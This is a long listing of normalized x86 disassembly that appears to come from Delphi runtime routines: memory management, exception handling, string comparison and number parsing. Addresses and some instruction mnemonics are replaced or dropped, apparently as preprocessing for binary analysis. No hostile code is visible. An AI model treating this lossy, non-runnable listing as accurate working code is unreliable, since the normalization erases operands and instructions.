dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401370
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403910
jmp r-xdata
call sub_401ea0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bb0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e18
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bb0
sub_40242c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ea0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bb0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fa4
test al al
je r-xdata
call sub_401bb0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c74
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e18
jmp r-xdata
sub_402608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026b9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40242c
test al al
je r-xdata
push rw-data
call sub_401368
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020f8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028c8
mov eax ebx
call sub_402288
retn
push rw-data
call sub_401370
sub_4026cc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402828
sub_4026ec
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402828
sub_40270c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402828
mov [ ecx ] eax
mov al 0x2
jmp sub_402828
retn
mov [ ecx ] eax
retn
sub_40279c
push ebx
push esi
call sub_405c18
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405c18
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405c18
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027dc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405c18
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027d0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402864
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028c8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402948
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402854
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_40299c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402854
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402854
jmp r-xdata
sub_4029f4
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_402a10
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402a94
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b04
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b24
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c04
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402c44
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402cf7 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402cf7 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402cf7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402f30
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402f60
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_402fd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
retn
sub_403054
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4030fc
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403154
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4048dc
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403174
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405500
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4031a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403228
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403238
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40322f
lea eax [ ebp - 0x8 ]
call sub_4054e8
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403174
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405500
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403238
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40327c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403304
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4032bc
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4032ec
push eax
push ecx
mov eax [ eax ]
call sub_4032bc
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e1c
call [ rw-data ]
sub_403334
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4032bc
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_40335c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4033ac
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4033fc
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403425
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403490
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4034cc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4034e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4034f4
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403514
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4034f4
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403578
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403024
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405c18
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4034e0
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403490
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4036a4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403024
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403490
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405c18
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4034cc
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402a94
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_40382c
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403514
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403864
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403e1c
sub_40388c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405c18
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4030f0
call sub_403474
sub_4038e0
call sub_405c18
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4030f0
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_40353c
jmp edx
sub_403928
push ebp
mov ebp esp
